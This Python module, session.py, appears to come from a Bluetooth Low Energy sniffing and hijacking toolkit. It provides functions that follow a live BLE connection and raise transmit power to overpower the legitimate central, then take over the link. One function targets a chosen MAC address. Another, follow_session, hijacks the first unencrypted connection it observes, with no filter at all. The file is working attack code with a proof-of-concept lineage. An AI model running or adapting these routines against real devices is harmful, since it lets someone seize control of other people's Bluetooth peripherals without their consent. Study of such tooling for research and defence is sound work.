"""
session.py - three entry points that return a live CentralLink:

  connect_session(hw, peer_mac, ...)      - initiate a connection as central
  hijack_session(hw, target_mac, ...)     - sniff then hijack a specific MAC
  follow_session(hw, ...)                 - hijack the first connection seen (no MAC filter)
"""

from time import time
from serial import SerialTimeoutException
from .constants import SnifferMode
from .sniffer_state import StateMessage, SnifferState
from .packet_decoder import PacketMessage, DPacketMessage, DataMessage
from .central_link import CentralLink
from .posture import Posture


def _wait_state(hw, target, timeout, sink=None):
    """Drain hw.recv_and_decode() until a StateMessage with new_state==target arrives,
    or until timeout seconds have elapsed.  Returns True on success, False on timeout.
    An optional sink callable is called with every received message."""
    deadline = time() + timeout
    while time() < deadline:
        try:
            msg = hw.recv_and_decode()
        except SerialTimeoutException:
            continue  # no data this interval - re-check the deadline
        if sink:
            sink(msg)
        if isinstance(msg, StateMessage) and msg.new_state == target:
            return True
    return False


def connect_session(hw, peer_mac, is_random=True, posture=None, timeout=10, **kw):
    """Initiate a BLE connection to peer_mac and return a live CentralLink.

    peer_mac: 6-byte list, little-endian (as produced by parse_mac in hijack_poc.py,
              e.g. [0xFF, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA] for AA:BB:CC:DD:EE:FF).
    is_random: True if the peer uses a random address (default), False for public.
    posture:   optional Posture instance; one will be created if not supplied.

    Raises RuntimeError if CENTRAL state is not reached within 10 seconds.
    """
    posture = posture or Posture()
    # initiate_conn returns the connection's access address. The host decoder must
    # be told it, or every data PDU is mis-parsed as an advertisement (the sniffer
    # never sees a CONNECT_IND when WE initiate). Mirrors initiator.py.
    aa = hw.initiate_conn(peer_mac, is_random=is_random)
    hw.mark_and_flush()
    if not _wait_state(hw, SnifferState.CENTRAL, timeout):
        raise RuntimeError("failed to reach CENTRAL (connect_session timed out)")
    # Set the decoder's connection AA only AFTER reaching CENTRAL. During the
    # INITIATING phase the sniffer hears advertisements on ch >= 37, and the
    # decoder resets cur_aa back to the advertising AA on those - so an earlier
    # assignment gets clobbered and every connection data PDU (incl. our ATT
    # responses) is mis-decoded as an advert, making att_request time out.
    # Flush first so any advert still buffered from INITIATING is consumed
    # before we lock in the AA (and before the CentralLink pump starts reading).
    hw.mark_and_flush()
    hw.decoder_state.cur_aa = aa
    return CentralLink(hw, on_control=posture.note_control_opcode, on_smp=posture.note_smp)


def hijack_session(hw, target_mac, advchan=37, stabilize_events=20,
                   tx_power=5, posture=None, **kw):
    """Sniff for a connection to target_mac, wait for timing to stabilise,
    then fire cmd_hijack_live() and return a live CentralLink.

    target_mac: 6-byte list, little-endian - the peripheral's MAC.
    advchan:    primary advertising channel to listen on (37/38/39).
    stabilize_events: number of C->P connection events to observe before hijacking.
    tx_power:   TX power in dBm to set before firing the hijack (-20..+5).
    posture:    optional Posture instance; one will be created if not supplied.

    Raises RuntimeError if any phase times out or if the connection is encrypted.
    """
    posture = posture or Posture()

    # target_mac is always truthy here (6-byte list), so hop3=True is safe.
    hw.setup_sniffer(
        mode=SnifferMode.CONN_FOLLOW,
        chan=advchan,
        targ_mac=target_mac,
        hop3=True,
        rssi_min=-128,
    )
    hw.cmd_instahop(True)
    hw.mark_and_flush()

    # Phase 1: wait until the sniffer latches onto the connection (DATA state).
    if not _wait_state(hw, SnifferState.DATA, 60,
                       sink=lambda m: _feed_posture(m, posture)):
        raise RuntimeError("hijack_session: target never connected (DATA state timeout)")

    # Phase 2: accumulate enough connection events for the firmware to have
    # a stable nextHopTime before firing the hijack.
    _stabilize(hw, stabilize_events, posture)

    if posture.encrypted:
        raise RuntimeError(
            "hijack_session: target connection is encrypted - cannot hijack")

    # Phase 3: boost TX power to outgun the original central, then hijack.
    hw.cmd_tx_power(tx_power)
    hw.cmd_hijack_live()

    if not _wait_state(hw, SnifferState.CENTRAL, 10):
        raise RuntimeError("hijack_session: hijack did not reach CENTRAL state")

    return CentralLink(hw, on_control=posture.note_control_opcode, on_smp=posture.note_smp)


def follow_session(hw, advchan=37, **kw):
    """Hijack the first BLE connection seen on advchan - no MAC filter.

    Internally calls hijack_session with target_mac=None.  Because setup_sniffer
    rejects hop3=True when no MAC is given, hop3 is forced to False here.
    """
    posture = kw.pop('posture', None) or Posture()
    stabilize_events = kw.pop('stabilize_events', 20)
    tx_power = kw.pop('tx_power', 5)

    # No MAC filter: cmd_mac() is called with no argument (clears any filter).
    # hop3 must be False - setup_sniffer raises UsageError if hop3=True and
    # targ_mac is None.
    hw.setup_sniffer(
        mode=SnifferMode.CONN_FOLLOW,
        chan=advchan,
        targ_mac=None,
        hop3=False,
        rssi_min=-128,
    )
    hw.cmd_instahop(True)
    hw.mark_and_flush()

    if not _wait_state(hw, SnifferState.DATA, 60,
                       sink=lambda m: _feed_posture(m, posture)):
        raise RuntimeError("follow_session: no connection seen (DATA state timeout)")

    _stabilize(hw, stabilize_events, posture)

    if posture.encrypted:
        raise RuntimeError(
            "follow_session: connection is encrypted - cannot hijack")

    hw.cmd_tx_power(tx_power)
    hw.cmd_hijack_live()

    if not _wait_state(hw, SnifferState.CENTRAL, 10):
        raise RuntimeError("follow_session: hijack did not reach CENTRAL state")

    return CentralLink(hw, on_control=posture.note_control_opcode, on_smp=posture.note_smp)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _feed_posture(msg, posture):
    """Feed a single message into posture during the DATA-state wait phase."""
    if msg is None:
        return
    if isinstance(msg, PacketMessage):
        # recv_and_decode() already returns DPacketMessage subclasses, but
        # we accept plain PacketMessage too (returned on decode errors).
        d = DPacketMessage.decode(msg) if type(msg) is PacketMessage else msg
        if isinstance(d, DataMessage) and len(d.body) >= 3 and (d.body[0] & 0x3) == 0x3:
            posture.note_control_opcode(d.body[2])


def _stabilize(hw, n, posture):
    """Count n C->P data packets to confirm the firmware's hop-timing is stable."""
    count = 0
    deadline = time() + 30
    while count < n and time() < deadline:
        try:
            msg = hw.recv_and_decode()
        except SerialTimeoutException:
            continue  # no data this interval - re-check the deadline
        if msg is None:
            continue
        if isinstance(msg, PacketMessage):
            d = DPacketMessage.decode(msg) if type(msg) is PacketMessage else msg
            if isinstance(d, DataMessage):
                if (d.body[0] & 0x3) == 0x3 and len(d.body) >= 3:
                    posture.note_control_opcode(d.body[2])
                if d.data_dir == 0:      # C->P: one new connection event
                    count += 1
                posture.saw_plaintext_att = True
